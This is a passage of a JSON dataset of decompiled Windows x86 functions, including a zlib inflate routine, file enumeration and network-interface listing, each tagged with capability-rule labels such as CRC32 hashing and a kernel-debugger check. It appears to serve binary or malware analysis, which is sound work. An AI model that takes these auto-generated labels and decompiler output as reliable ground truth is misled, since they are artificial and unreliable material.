0x4934a4) * 2 + 0x6c) = 0;\n            }\n            piVar2[0x1a] = piVar2 + 0x14b;\n            piVar2[0x12] = piVar2 + 0x14b;\n            piVar2[0x14] = 7;\n            in_EAX = piVar2 + 0xbb;\n            iVar8 = fcn.0046adbc(in_EAX, piVar2 + 0x14, piVar2 + 0x1a);\n            if (iVar8 == 0) {\n                piVar2[0x19] = 0;\n                *piVar2 = 9;\ncode_r0x0046a33d:\n                while (piVar2[0x19] <= piVar2[0x17] + piVar2[0x18] && piVar2[0x17] + piVar2[0x18] != piVar2[0x19]) {\n                    while( true ) {\n                        uVar4 = *(piVar2[0x12] + ((1 << (piVar2[0x14] & 0x1f)) - 1U & uStack44) * 4);\n                        uStack28._1_1_ = uVar4 >> 8;\n                        if (uStack28._1_1_ <= uVar13) break;\n                        if (puVar14 == NULL) goto code_r0x0046a936;\n                        uVar1 = *arg_ch;\n                        arg_ch = arg_ch + 1;\n                        uStack44 = uStack44 + (uVar1 << (uVar13 & 0x1f));\n                        puVar14 = puVar14 + -1;\n                        uVar13 = uVar13 + 8;\n                    }\n                    uStack28._2_2_ = uVar4 >> 0x10;\n                    if (uStack28._2_2_ < 0x10) {\n                        for (; uVar13 < uStack28._1_1_; uVar13 = uVar13 + 8) {\n                            if (puVar14 == NULL) goto code_r0x0046a936;\n                            uVar1 = *arg_ch;\n                            arg_ch = arg_ch + 1;\n                            uStack44 = uStack44 + (uVar1 << (uVar13 & 0x1f));\n                            puVar14 = puVar14 + -1;\n                        }\n                        uStack44 = uStack44 >> (uStack28._1_1_ & 0x1f);\n                        uVar13 = uVar13 - uStack28._1_1_;\n                        iVar8 = piVar2[0x19];\n                        piVar2[0x19] = piVar2[0x19] + 1;\n                        *(piVar2 + iVar8 * 2 + 0x6c) = uStack28._2_2_;\n                    }\n                    else {\n                        if (uStack28._2_2_ == 0x10) {\n                            for (; uVar13 < uStack28._1_1_ + 2; uVar13 = uVar13 + 8) {\n                                if (puVar14 == NULL) goto code_r0x0046a936;\n                                uVar1 = *arg_ch;\n                                arg_ch = arg_ch + 1;\n                                uStack44 = uStack44 + (uVar1 << (uVar13 & 0x1f));\n                                puVar14 = puVar14 + -1;\n                            }\n                            uStack44 = uStack44 >> (uStack28._1_1_ & 0x1f);\n                            uVar13 = uVar13 - uStack28._1_1_;\n                            if (piVar2[0x19] == 0) {\n                                in_EAX[6] = \"invalid bit length repeat\";\n                                *piVar2 = 0x12;\n                                break;\n                            }\n                            uVar6 = *(piVar2 + piVar2[0x19] * 2 + 0x6a);\n                            puStack32 = (uStack44 & 3) + 3;\n                            uStack44 = uStack44 >> 2;\n                            uVar13 = uVar13 - 2;\n                        }\n                        else if (uStack28._2_2_ == 0x11) {\n                            for (; uVar13 < uStack28._1_1_ + 3; uVar13 = uVar13 + 8) {\n                                if (puVar14 == NULL) goto code_r0x0046a936;\n                                uVar1 = *arg_ch;\n                                arg_ch = arg_ch + 1;\n                                uStack44 = uStack44 + (uVar1 << (uVar13 & 0x1f));\n                                puVar14 = puVar14 + -1;\n                            }\n                            uStack44 = uStack44 >> (uStack28._1_1_ & 0x1f);\n                            uVar6 = 0;\n                            puStack32 = (uStack44 & 7) + 3;\n                            uStack44 = uStack44 >> 3;\n                            uVar13 = (uVar13 - uStack28._1_1_) - 3;\n                        }\n                        else {\n                            for (; uVar13 < uStack28._1_1_ + 7; uVar13 = uVar13 + 8) {\n                                if (puVar14 == NULL) goto code_r0x0046a936;\n                                uVar1 = *arg_ch;\n                                arg_ch = arg_ch + 1;\n                                uStack44 = uStack44 + (uVar1 << (uVar13 & 0x1f));\n                                puVar14 = puVar14 + -1;\n                            }\n                            uStack44 = uStack44 >> (uStack28._1_1_ & 0x1f);\n                            uVar6 = 0;\n                            puStack32 = (uStack44 & 0x7f) + 0xb;\n                            uStack44 = uStack44 >> 7;\n                            uVar13 = (uVar13 - uStack28._1_1_) - 7;\n                        }\n                        if (piVar2[0x17] + piVar2[0x18] < piVar2[0x19] + puStack32) {\n                            in_EAX[6] = \"invalid bit length repeat\";\n                            *piVar2 = 0x12;\n                            break;\n                        }\n                        while (puStack32 != NULL) {\n                            iVar8 = piVar2[0x19];\n                            piVar2[0x19] = piVar2[0x19] + 1;\n                            *(piVar2 + iVar8 * 2 + 0x6c) = uVar6;\n                            puStack32 = puStack32 + -1;\n                        }\n                    }\n                }\n                if (*piVar2 != 0x12) {\n                    piVar2[0x1a] = piVar2 + 0x14b;\n                    piVar2[0x12] = piVar2 + 0x14b;\n                    piVar2[0x14] = 9;\n                    in_EAX = piVar2 + 0xbb;\n                    iVar8 = fcn.0046adbc(in_EAX, piVar2 + 0x14, piVar2 + 0x1a);\n                    if (iVar8 == 0) {\n                        piVar2[0x13] = piVar2[0x1a];\n                        piVar2[0x15] = 6;\n                        in_EAX = piVar2 + 0xbb;\n                        uStack44 = fcn.0046adbc(in_EAX, piVar2 + 0x15, piVar2 + 0x1a);\n                        if (uStack44 == 0) {\n                            *piVar2 = 10;\ncode_r0x0046a400:\n                            if ((puVar14 < 0x6) || (puStack48 < 0x102)) {\n                                for (; uVar12 = *(piVar2[0x12] + ((1 << (piVar2[0x14] & 0x1f)) - 1U & uStack44) * 4), \n                                    uVar13 < (uVar12 >> 8 & 0xff); uVar13 = uVar13 + 8) {\n                                    if (puVar14 == NULL) goto code_r0x0046a936;\n                                    uVar1 = *arg_ch;\n                                    arg_ch = arg_ch + 1;\n                                    uStack44 = uStack44 + (uVar1 << (uVar13 & 0x1f));\n                                    puVar14 = puVar14 + -1;\n                                }\n                                uStack28._0_1_ = uVar12;\n                                uStack28 = uVar12;\n                                if ((uStack28 != '\\0') && ((uVar12 & 0xf0) == 0)) {\n                                    while( true ) {\n                                        uStack23 = uVar12 >> 8;\n                                        uStack28 = *(piVar2[0x12] +\n                                                    ((((1 << (uStack23 + uStack28 & 0x1f)) - 1U & uStack44) >>\n                                                     (uStack23 & 0x1f)) + (uVar12 >> 0x10)) * 4);\n                                        if (uStack23 + (uStack28 >> 8 & 0xff) <= uVar13) break;\n                                        if (puVar14 == NULL) goto code_r0x0046a936;\n                                        uVar1 = *arg_ch;\n                                        arg_ch = arg_ch + 1;\n                                        uStack44 = uStack44 + (uVar1 << (uVar13 & 0x1f));\n                                        puVar14 = puVar14 + -1;\n                                        uVar13 = uVar13 + 8;\n                                    }\n                                    uStack44 = uStack44 >> (uStack23 & 0x1f);\n                                    uVar13 = uVar13 - uStack23;\n                                }\n                                uStack44 = uStack44 >> (uStack28._1_1_ & 0x1f);\n                                uVar13 = uVar13 - uStack28._1_1_;\n                                piVar2[0xf] = uStack28 >> 0x10;\n                                if (uStack28 == '\\0') {\n                                    *piVar2 = 0xf;\n                                }\n                                else if ((uStack28 & 0x20) == 0) {\n                                    if ((uStack28 & 0x40) == 0) {\n                                        piVar2[0x11] = uStack28 & 0xf;\n                                        *piVar2 = 0xb;\ncode_r0x0046a5a0:\n                                        if (piVar2[0x11] != 0) {\n                                            for (; uVar13 < piVar2[0x11]; uVar13 = uVar13 + 8) {\n                                                if (puVar14 == NULL) goto code_r0x0046a936;\n                                                uVar1 = *arg_ch;\n                                                arg_ch = arg_ch + 1;\n                                                uStack44 = uStack44 + (uVar1 << (uVar13 & 0x1f));\n                                                puVar14 = puVar14 + -1;\n                                            }\n                                            piVar2[0xf] = piVar2[0xf] + ((1 << (piVar2[0x11] & 0x1f)) - 1U & uStack44);\n                                            uStack44 = uStack44 >> (piVar2[0x11] & 0x1f);\n                                            uVar13 = uVar13 - piVar2[0x11];\n                                        }\n                                        *piVar2 = 0xc;\ncode_r0x0046a5e9:\n                                        for (; uVar12 = *(piVar2[0x13] +\n                                                         ((1 << (piVar2[0x15] & 0x1f)) - 1U & uStack44) * 4), \n                                            uVar13 < (uVar12 >> 8 & 0xff); uVar13 = uVar13 + 8) {\n                                            if (puVar14 == NULL) goto code_r0x0046a936;\n                                            uVar1 = *arg_ch;\n                                            arg_ch = arg_ch + 1;\n                                            uStack44 = uStack44 + (uVar1 << (uVar13 & 0x1f));\n                                            puVar14 = puVar14 + -1;\n                                        }\n                                        uStack28 = uVar12;\n                                        if ((uVar12 & 0xf0) == 0) {\n                                            while( true ) {\n                                                cStack24 = uVar12;\n                                                uStack23 = uVar12 >> 8;\n                                                uStack28 = *(piVar2[0x13] +\n                                                            ((((1 << (uStack23 + cStack24 & 0x1f)) - 1U & uStack44) >>\n                                                             (uStack23 & 0x1f)) + (uVar12 >> 0x10)) * 4);\n                                                if (uStack23 + (uStack28 >> 8 & 0xff) <= uVar13) break;\n                                                if (puVar14 == NULL) goto code_r0x0046a936;\n                                                uVar1 = *arg_ch;\n                                                arg_ch = arg_ch + 1;\n                                                uStack44 = uStack44 + (uVar1 << (uVar13 & 0x1f));\n                                                puVar14 = puVar14 + -1;\n                                                uVar13 = uVar13 + 8;\n                                            }\n                                            uStack44 = uStack44 >> (uStack23 & 0x1f);\n                                            uVar13 = uVar13 - uStack23;\n                                        }\n                                        uStack44 = uStack44 >> (uStack28._1_1_ & 0x1f);\n                                        uVar13 = uVar13 - uStack28._1_1_;\n                                        if ((uStack28 & 0x40) == 0) {\n                                            piVar2[0x10] = uStack28 >> 0x10;\n                                            piVar2[0x11] = uStack28 & 0xf;\n                                            *piVar2 = 0xd;\ncode_r0x0046a6ec:\n                                            if (piVar2[0x11] != 0) {\n                                                for (; uVar13 < piVar2[0x11]; uVar13 = uVar13 + 8) {\n                                                    if (puVar14 == NULL) goto code_r0x0046a936;\n                                                    uVar1 = *arg_ch;\n                                                    arg_ch = arg_ch + 1;\n                                                    uStack44 = uStack44 + (uVar1 << (uVar13 & 0x1f));\n                                                    puVar14 = puVar14 + -1;\n                                                }\n                                                piVar2[0x10] = piVar2[0x10] +\n                                                               ((1 << (piVar2[0x11] & 0x1f)) - 1U & uStack44);\n                                                uStack44 = uStack44 >> (piVar2[0x11] & 0x1f);\n                                                uVar13 = uVar13 - piVar2[0x11];\n                                            }\n                                            if (puStack36 + (piVar2[10] - puStack48) < piVar2[0x10]) {\n                                                in_EAX[6] = \"invalid distance too far back\";\n                                                *piVar2 = 0x12;\n                                            }\n                                            else {\n                                                *piVar2 = 0xe;\ncode_r0x0046a75a:\n                                                if (puStack48 == NULL) goto code_r0x0046a936;\n                                                if (puStack36 - puStack48 < piVar2[0x10]) {\n                                                    puStack32 = piVar2[0x10] - (puStack36 - puStack48);\n                                                    puVar7 = piVar2[0xb];\n                                                    if (puVar7 < puStack32) {\n                                                        puStack32 = puStack32 + -puVar7;\n                                                        puVar7 = (piVar2[9] - puStack32) + piVar2[0xc];\n                                                    }\n                                                    else {\n                                                        puVar7 = puVar7 + (piVar2[0xc] - puStack32);\n                                                    }\n                                                    if (piVar2[0xf] < puStack32) {\n                                                        puStack32 = piVar2[0xf];\n                                                    }\n                                                }\n                                                else {\n                                                    puStack32 = piVar2[0xf];\n                                                    puVar7 = puVar9 + -piVar2[0x10];\n                                                }\n                                                if (puStack48 < puStack32) {\n                                                    puStack32 = puStack48;\n                                                }\n                                                puStack48 = puStack48 + -puStack32;\n                                                piVar2[0xf] = piVar2[0xf] - puStack32;\n                                                do {\n                                                    *puVar9 = *puVar7;\n                                                    puVar7 = puVar7 + 1;\n                                                    puVar9 = puVar9 + 1;\n                                                    puStack32 = puStack32 + -1;\n                                                } while (puStack32 != NULL);\n                                                if (piVar2[0xf] == 0) {\n                                                    *piVar2 = 10;\n                                                }\n                                            }\n                                        }\n                                        else {\n                                            in_EAX[6] = \"invalid distance code\";\n                                            *piVar2 = 0x12;\n                                        }\n                                    }\n                                    else {\n                                        in_EAX[6] = \"invalid literal/length code\";\n                                        *piVar2 = 0x12;\n                                    }\n                                }\n                                else {\n                                    *piVar2 = 3;\n                                }\n                            }\n                            else {\n                                in_EAX[3] = puVar9;\n                                in_EAX[4] = puStack48;\n                                *in_EAX = arg_ch;\n                                in_EAX[1] = puVar14;\n                                piVar2[0xd] = uStack44;\n                                piVar2[0xe] = uVar13;\n                                fcn.004693dc();\n                                puVar9 = in_EAX[3];\n                                puStack48 = in_EAX[4];\n                                arg_ch = *in_EAX;\n                                puVar14 = in_EAX[1];\n                                uStack44 = piVar2[0xd];\n                                uVar13 = piVar2[0xe];\n                            }\n                        }\n                        else {\n                            in_EAX[6] = \"invalid distances set\";\n                            *piVar2 = 0x12;\n                        }\n                    }\n                    else {\n                        in_EAX[6] = \"invalid literal/lengths set\";\n                        *piVar2 = 0x12;\n                    }\n                }\n            }\n            else {\n                in_EAX[6] = \"invalid code lengths set\";\n                *piVar2 = 0x12;\n            }\n            break;\n        case 9:\n            goto code_r0x0046a33d;\n        case 10:\n            goto code_r0x0046a400;\n        case 0xb:\n            goto code_r0x0046a5a0;\n        case 0xc:\n            goto code_r0x0046a5e9;\n        case 0xd:\n            goto code_r0x0046a6ec;\n        case 0xe:\n            goto code_r0x0046a75a;\n        case 0xf:\n            if (puStack48 == NULL) goto code_r0x0046a936;\n            *puVar9 = *(piVar2 + 0xf);\n            puVar9 = puVar9 + 1;\n            puStack48 = puStack48 + -1;\n            *piVar2 = 10;\n            break;\n        case 0x10:\n            if (piVar2[2] == 0) {\ncode_r0x0046a903:\n                *piVar2 = 0x11;\n                goto code_r0x0046a909;\n            }\n            for (; uVar13 < 0x20; uVar13 = uVar13 + 8) {\n                if (puVar14 == NULL) goto code_r0x0046a936;\n                uVar1 = *arg_ch;\n                arg_ch = arg_ch + 1;\n                uStack44 = uStack44 + (uVar1 << (uVar13 & 0x1f));\n                puVar14 = puVar14 + -1;\n            }\n            iVar8 = puStack36 - puStack48;\n            in_EAX[5] = in_EAX[5] + iVar8;\n            piVar2[7] = piVar2[7] + iVar8;\n            if (iVar8 != 0) {\n                puVar7 = fcn.0046797c();\n                piVar2[6] = puVar7;\n                in_EAX[0xc] = puVar7;\n            }\n            puStack36 = puStack48;\n            if ((uStack44 >> 0x18) + (uStack44 >> 8 & 0xff00) + (uStack44 & 0xff00) * 0x100 + uStack44 * 0x1000000 ==\n                piVar2[6]) {\n                uVar13 = 0;\n                uStack44 = 0;\n                goto code_r0x0046a903;\n            }\n            in_EAX[6] = \"incorrect data check\";\n            *piVar2 = 0x12;\n            break;\n        case 0x11:\ncode_r0x0046a909:\n            iStack20 = 1;\ncode_r0x0046a936:\n            in_EAX[3] = puVar9;\n            in_EAX[4] = puStack48;\n            *in_EAX = arg_ch;\n            in_EAX[1] = puVar14;\n            piVar2[0xd] = uStack44;\n            piVar2[0xe] = uVar13;\n            if (((piVar2[9] != 0) || ((*piVar2 < 0x10 && (in_EAX[4] != puStack36)))) &&\n               (iVar8 = fcn.00469a8c(),  iVar8 != 0)) {\n                *piVar2 = 0x13;\n                return -4;\n            }\n            iVar8 = puVar3 - in_EAX[1];\n            iVar5 = puStack36 - in_EAX[4];\n            in_EAX[2] = in_EAX[2] + iVar8;\n            in_EAX[5] = in_EAX[5] + iVar5;\n            piVar2[7] = piVar2[7] + iVar5;\n            if ((piVar2[2] != 0) && (iVar5 != 0)) {\n                puVar9 = fcn.0046797c();\n                piVar2[6] = puVar9;\n                in_EAX[0xc] = puVar9;\n            }\n            if (piVar2[1] == 0) {\n                iVar11 = 0;\n            }\n            else {\n                iVar11 = 0x40;\n            }\n            if (*piVar2 == 3) {\n                iVar10 = 0x80;\n            }\n            else {\n                iVar10 = 0;\n            }\n            in_EAX[0xb] = iVar11 + piVar2[0xe] + iVar10;\n            if (((iVar8 != 0) || (iVar5 != 0)) && (param_2 != 4)) {\n                return iStack20;\n            }\n            if (iStack20 != 0) {\n                return iStack20;\n            }\n            return -5;\n        case 0x12:\n            iStack20 = -3;\n            goto code_r0x0046a936;\n        case 0x13:\n            return -4;\n        default:\n            return -2;\n        }\n    } while( true );\n}\n",
        "token_count": 7974
    },
    "0046cedc": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0"
        ],
        "decompiled_code": "\nuint32_t __fastcall fcn.0046cedc(uint param_1, int32_t param_2)\n\n{\n    uint32_t uVar1;\n    uint32_t in_EAX;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    \n    uVar1 = 0;\n    do {\n        uVar2 = uVar1;\n        uVar3 = in_EAX & 1;\n        in_EAX = in_EAX >> 1;\n        param_2 = param_2 + -1;\n        uVar1 = (uVar2 | uVar3) * 2;\n    } while (0 < param_2);\n    return uVar2 & 0x7fffffff | uVar3;\n}\n",
        "token_count": 160
    },
    "0046d400": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n// WARNING: Variable defined which should be unmapped: var_10h\n// WARNING: Variable defined which should be unmapped: var_14h\n\nvoid __fastcall fcn.0046d400(uint param_1, uint param_2)\n\n{\n    uint32_t uVar1;\n    uint uVar2;\n    uchar *puVar3;\n    int32_t iVar4;\n    uint unaff_EBX;\n    uint unaff_ESI;\n    uint *in_FS_OFFSET;\n    uint var_328h;\n    uint var_324h;\n    uint var_320h;\n    uint var_31ch;\n    uint var_318h;\n    uint var_208h;\n    uint var_1b8h;\n    uint var_1b0h;\n    uint var_1ach;\n    uint var_1a8h;\n    uint var_1a4h;\n    uint var_19ch;\n    uint var_198h;\n    uint var_190h;\n    uint var_18ch;\n    uint32_t var_188h;\n    uint var_184h;\n    uint uStackY172;\n    uint uStackY164;\n    uint uStackY160;\n    uint uStackY156;\n    uint uStackY152;\n    uchar *puStackY148;\n    uint uStackY144;\n    uint uStackY140;\n    uint uStackY136;\n    uint uStackY132;\n    uint *arg_8h;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uchar *var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uchar *var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    var_24h = &stack0xfffffffc;\n    iVar4 = 0x65;\n    do {\n        iVar4 = iVar4 + -1;\n    } while (iVar4 != 0);\n    var_18h = 0x46d423;\n    var_19ch = param_2;\n    var_10h = unaff_ESI;\n    var_ch = unaff_EBX;\n    fcn.004059cc();\n    var_18h = 0x46d434;\n    fcn.00405fe8();\n    var_1ch = 0x46d75f;\n    var_20h = *in_FS_OFFSET;\n    *in_FS_OFFSET = &fcn.0046d400::var_20h;\n    var_28h = 0x46d6ee;\n    var_2ch = *in_FS_OFFSET;\n    *in_FS_OFFSET = &fcn.0046d400::var_2ch;\n    var_18h = &stack0xfffffffc;\n    fcn.00405864();\n    iVar4 = fcn.0040a488();\n    uVar1 = var_188h;\n    while (iVar4 == 0) {\n        var_188h = uVar1;\n        if ((uVar1 & 2) == 0) {\n            fcn.004055c8();\n        }\n        else {\n            fcn.004055c8();\n        }\n        if ((uVar1 & 0x20) == 0) {\n            fcn.004055c8();\n        }\n        else {\n            fcn.004055c8();\n        }\n        if ((uVar1 & 1) == 0) {\n            fcn.004055c8();\n        }\n        else {\n            fcn.004055c8();\n        }\n        if ((uVar1 & 4) == 0) {\n            fcn.004055c8();\n        }\n        else {\n            fcn.004055c8();\n        }\n        puVar3 = var_18h;\n        uVar2 = var_1ch;\n        fcn.004058e0();\n        if ((uVar1 & 0x10) == 0) {\n            fcn.00405864();\n            fcn.004059dc();\n            sub.shell32.dll_SHGetFileInfoA();\n            fcn.004057a0();\n            arg_8h = &fcn.0046d400::var_1b0h;\n            fcn.00405864();\n            fcn.0048c72c(arg_8h);\n            fcn.0040c8f8();\n            fcn.0040c8f8();\n            uStackY132 = 0x46d697;\n            fcn.00409e5c(var_190h);\n            uStackY136 = 0x46d7c0;\n            uStackY140 = var_10h;\n            uStackY144 = 0x46d7c0;\n            puStackY148 = puVar3;\n            uStackY152 = 0x46d7c0;\n            uStackY156 = uVar2;\n            uStackY160 = 0x46d7c0;\n            uStackY164 = var_28h;\n            var_2ch = 0x46d7cc;\n            uStackY172 = 0x46d6cf;\n            fcn.004058e0();\n        }\n        else {\n            fcn.0048c72c(&fcn.0046d400::var_1b0h);\n            fcn.0040c8f8();\n            fcn.0040c8f8();\n            var_2ch = 0x46d7cc;\n            fcn.004058e0();\n        }\n        iVar4 = fcn.0040a4d8();\n        uVar1 = var_188h;\n    }\n    *in_FS_OFFSET = var_2ch;\n    var_24h = 0x46d708;\n    fcn.0040a4fc();\n    var_24h = var_8h;\n    var_28h = 0x46d7d8;\n    var_2ch = var_ch;\n    fcn.004058e0();\n    *in_FS_OFFSET = var_2ch;\n    var_24h = 0x46d766;\n    var_28h = 0x46d740;\n    fcn.00405554();\n    var_28h = 0x46d751;\n    fcn.004060ac();\n    var_28h = 0x46d75e;\n    fcn.00405554();\n    return;\n}\n",
        "token_count": 1437
    },
    "00472e88": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0"
        ],
        "decompiled_code": "\nvoid fcn.00472e88(void)\n\n{\n    uint32_t uVar1;\n    uint *in_EAX;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint *puVar4;\n    int32_t *in_FS_OFFSET;\n    int32_t in_stack_fffff94c;\n    int32_t iStack1688;\n    uint uStack1684;\n    uchar *puStack1680;\n    uint uStack1676;\n    uint uStack1672;\n    uint uStack1668;\n    int32_t iStack1664;\n    uint uStack1660;\n    uchar *puStack1656;\n    uint var_664h;\n    uint var_660h;\n    uint var_65ch;\n    uint var_658h;\n    uint var_654h;\n    uint var_1ch;\n    uint in;\n    uint uStack24;\n    uint uStack20;\n    int32_t var_ch;\n    int32_t var_8h;\n    int32_t s;\n    \n    puStack1656 = &stack0xfffffffc;\n    uStack1660 = 0x473108;\n    iStack1664 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xfffff980;\n    uStack1668 = 0x472ec1;\n    fcn.00405530();\n    uStack1668 = 0;\n    uStack1672 = 1;\n    uStack1676 = 2;\n    puStack1680 = 0x472ecc;\n    iVar2 = sub.wsock32.dll_socket();\n    s = iVar2;\n    if (iVar2 != -1) {\n        uStack1684 = 0x4730d5;\n        iStack1688 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xfffff968;\n        puStack1680 = &stack0xfffffffc;\n        iVar3 = sub.WS2_32.DLL_WSAIoctl\n                          (iVar2, 0x4004747f, 0, 0, &fcn.00472e88::var_658h, 0x400, &fcn.00472e88::var_8h, 0, 0);\n        if ((iVar3 != -1) && (-1 < var_8h / 0x4c + -1)) {\n            var_ch = var_8h / 0x4c;\n            puVar4 = &fcn.00472e88::var_654h;\n            do {\n                var_1ch = *puVar4;\n                in = puVar4[1];\n                uStack24 = puVar4[2];\n                uStack20 = puVar4[3];\n                sub.wsock32.dll_inet_ntoa(puVar4[1]);\n                fcn.00405728(0x473120, *in_EAX);\n                fcn.004058e0(0x473130, 0);\n                var_1ch = puVar4[0xc];\n                in = puVar4[0xd];\n                uStack24 = puVar4[0xe];\n                uStack20 = puVar4[0xf];\n                sub.wsock32.dll_inet_ntoa(puVar4[0xd]);\n                fcn.00405728(0x47313c, *in_EAX);\n                fcn.004058e0(0x473130, 0);\n                var_1ch = puVar4[6];\n                in = puVar4[7];\n                uStack24 = puVar4[8];\n                uStack20 = puVar4[9];\n                sub.wsock32.dll_inet_ntoa(puVar4[7]);\n                fcn.00405728(0x473150, *in_EAX);\n                fcn.004058e0(0x473130, 0);\n                uVar1 = puVar4[-1];\n                if ((uVar1 & 1) == 1) {\n                    fcn.004058e0(0x473130, 0x473170, *in_EAX);\n                }\n                else {\n                    fcn.004058e0(0x473130, 0x473188, *in_EAX);\n                }\n                if ((uVar1 & 2) == 2) {\n                    fcn.004058e0(0x473130, 0x4731a0, *in_EAX);\n                }\n                else {\n                    fcn.004058e0(0x473130, 0x4731bc, *in_EAX);\n                }\n                if ((uVar1 & 4) == 4) {\n                    fcn.004058e0(0x473130, 0x4731d8, *in_EAX);\n                }\n                else {\n                    fcn.004058e0(0x473130, 0x4731f4, *in_EAX);\n                }\n                iVar2 = 0x473130;\n                fcn.004058e0();\n                puVar4 = puVar4 + 0x13;\n                var_ch = var_ch + -1;\n            } while (var_ch != 0);\n        }\n        *in_FS_OFFSET = iVar2;\n        in_stack_fffff94c = s;\n        sub.wsock32.dll_closesocket();\n    }\n    *in_FS_OFFSET = in_stack_fffff94c;\n    fcn.00405554(0x47310f);\n    return;\n}\n",
        "token_count": 1184
    },
    "004760a4": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_2d4h\n// WARNING: Variable defined which should be unmapped: var_2cch\n// WARNING: Variable defined which should be unmapped: var_304h\n// WARNING: Variable defined which should be unmapped: var_338h\n// WARNING: Variable defined which should be unmapped: var_34ch\n// WARNING: Variable defined which should be unmapped: var_360h\n// WARNING: Variable defined which should be unmapped: var_374h\n// WARNING: Variable defined which should be unmapped: var_3d4h\n// WARNING: Variable defined which should be unmapped: var_3f8h\n// WARNING: Variable defined which should be unmapped: var_41ch\n// WARNING: Variable defined which should be unmapped: var_440h\n// WARNING: Variable defined which should be unmapped: var_450h\n// WARNING: Variable defined which should be unmapped: var_470h\n// WARNING: Variable defined which should be unmapped: var_494h\n// WARNING: Variable defined which should be unmapped: var_554h\n// WARNING: Variable defined which should be unmapped: var_598h\n// WARNING: Variable defined which should be unmapped: var_594h\n// WARNING: Variable defined which should be unmapped: var_10h\n// WARNING: Variable defined which should be unmapped: var_14h\n// WARNING: Variable defined which should be unmapped: var_18h\n\nvoid fcn.004760a4(void)\n\n{\n    char cVar1;\n    uint8_t uVar2;\n    int32_t in_EAX;\n    uint uVar3;\n    int32_t iVar4;\n    uint32_t uVar5;\n    int32_t iVar6;\n    int32_t iVar7;\n    int32_t *piVar8;\n    uint *puVar9;\n    uint *unaff_EBX;\n    int32_t unaff_ESI;\n    int32_t iVar10;\n    int32_t unaff_EDI;\n    int32_t *in_FS_OFFSET;\n    uchar uVar11;\n    uint *puStack2220;\n    uint *puStack2208;\n    uchar *puVar12;\n    uchar *puVar13;\n    uint var_76ch;\n    code *pcStack1896;\n    uint uStack1892;\n    uint uStack1888;\n    uint *puStack1884;\n    uchar *puStack1880;\n    uint uStack1876;\n    uint uStack1872;\n    code *pcStack1868;\n    uint uStack1864;\n    uint uStack1860;\n    uint *puStack1856;\n    uchar *puStack1852;\n    uint uStack1848;\n    uint uStack1844;\n    code *pcStack1840;\n    uint uStack1836;\n    uint uStack1832;\n    uint *puStack1828;\n    uchar *arg_8h;\n    uint uStack1820;\n    uint uStack1816;\n    code *pcStack1812;\n    uint *puStack1808;\n    uint *puStack1804;\n    uint *puStack1800;\n    uchar *puStack1796;\n    uint *in_stack_fffff900;\n    uint uStack1780;\n    uint uStack1776;\n    uint uStack1772;\n    uint uStack1768;\n    int32_t iStack1764;\n    uint var_6cch;\n    uint var_6c8h;\n    uint uStack1684;\n    uint uStack1680;\n    int32_t iStack1676;\n    uint uStack1672;\n    uint uStack1668;\n    uint *puStack1664;\n    uint uStack1660;\n    uint uStack1656;\n    uint uStack1652;\n    uint uStack1648;\n    uchar *puStack1644;\n    uchar *puStack1640;\n    uint uStack1636;\n    int32_t iStack1632;\n    uint uStack1628;\n    uint uStack1624;\n    uint uStack1620;\n    uint uStack1616;\n    uint uStack1612;\n    uint uStack1608;\n    uint uStack1604;\n    uchar *puStack1600;\n    uint *puStack1596;\n    uchar *puStack1592;\n    uint uStack1588;\n    uint uStack1584;\n    uint uStack1580;\n    code *pcStack1576;\n    int32_t iStack1572;\n    uint uStack1568;\n    uint *puStack1564;\n    uint uStack1560;\n    uint uStack1556;\n    uint *puStack1552;\n    uchar *puStack1548;\n    uint uStack1544;\n    uint uStack1540;\n    uint *puStack1536;\n    uint uStack1532;\n    uint *puStack1528;\n    uint *puStack1524;\n    uchar *puVar14;\n    uint *puStack1512;\n    uchar *puStack1508;\n    uchar *var_5dch;\n    uint uStack1500;\n    uint uStack1496;\n    uint uStack1492;\n    uint uStack1488;\n    uint uStack1484;\n    uint uStack1480;\n    uchar *puStack1476;\n    uchar *puStack1472;\n    uchar *puStack1468;\n    uchar *arg_8h_00;\n    uint *puStack1460;\n    uchar *arg_8h_01;\n    uint *puStack1448;\n    uint *puStack1444;\n    uint *var_59ch;\n    uint *var_598h;\n    uint32_t var_594h;\n    uint *var_590h;\n    uint var_58ch;\n    uint var_588h;\n    int32_t var_584h;\n    uint var_580h;\n    uint var_57ch;\n    uint var_578h;\n    uint *var_574h;\n    uint var_570h;\n    uint var_56ch;\n    uint var_568h;\n    uint var_564h;\n    int32_t var_560h;\n    uint var_55ch;\n    uint *var_558h;\n    uint *var_554h;\n    uint var_550h;\n    uint var_54ch;\n    uint var_548h;\n    uint var_544h;\n    uint var_540h;\n    uint var_53ch;\n    uint var_538h;\n    uint var_534h;\n    uint var_530h;\n    uint var_52ch;\n    uint var_528h;\n    uint *var_524h;\n    uint *var_520h;\n    int32_t var_51ch;\n    uint *var_518h;\n    uint var_514h;\n    int32_t var_510h;\n    uint var_50ch;\n    uint *var_508h;\n    uint var_504h;\n    uint var_500h;\n    uint var_4fch;\n    int32_t var_4f8h;\n    uint var_4f4h;\n    uint var_4f0h;\n    uint var_4ech;\n    uint *var_4e8h;\n    uint var_4e4h;\n    uint var_4e0h;\n    uint var_4dch;\n    uint var_4d8h;\n    uint var_4d4h;\n    uint var_4d0h;\n    int32_t var_4cch;\n    uint var_4c8h;\n    uint var_4c4h;\n    int32_t 